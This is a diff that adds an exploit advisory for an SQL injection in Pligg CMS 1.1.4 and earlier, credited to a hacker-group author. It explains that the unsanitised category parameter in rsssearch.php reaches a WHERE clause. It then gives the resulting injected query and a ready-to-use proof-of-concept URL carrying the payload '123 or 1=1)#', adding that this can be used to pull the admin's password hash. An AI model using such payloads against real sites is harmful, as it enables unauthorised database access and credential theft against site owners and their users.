@@ -1,0 +1,32 @@
+# Exploit Title: Pligg <= 1.1.4 SQL injection
+# Date: 03/23/2011
+# Author: Null-0x00
+# Software Link: http://pligg.com/
+# Version: <= 1.1.4
+# Websites: zenk-security.com & hackerzvoice.net
+
+
+# Description #
+
+An SQL Injection has been found on /rsssearch.php in pligg CMS 1.1.4. Prior
+versions (works on 1.1.3) might also be vulnerables.
+
+The $_REQUEST['category'] is not sanitized properly, and is used in a SQL
+request in a WHERE clause. The resulting request can be :
+
+SELECT pligg_links.link_id AS link_id, [...] FROM pligg_links LEFT JOIN
+pligg_groups ON pligg_links.link_group_id = pligg_groups.group_id WHERE 1
+AND ( [...] AND pligg_links.link_category = 123 or 1=1)# ) AND
+pligg_links.link_status IN ('published','queued')
+
+
+# Test #
+
+To make this request happen, use this URL :
+
+http://WEBSITE/pligg/rsssearch.php?search=test&adv=1&scategory=123+or+1=1%29%23
+
+This can be used to retrieve information such as the admin's password hash,
+etc.
+
+Have a nice day, Null
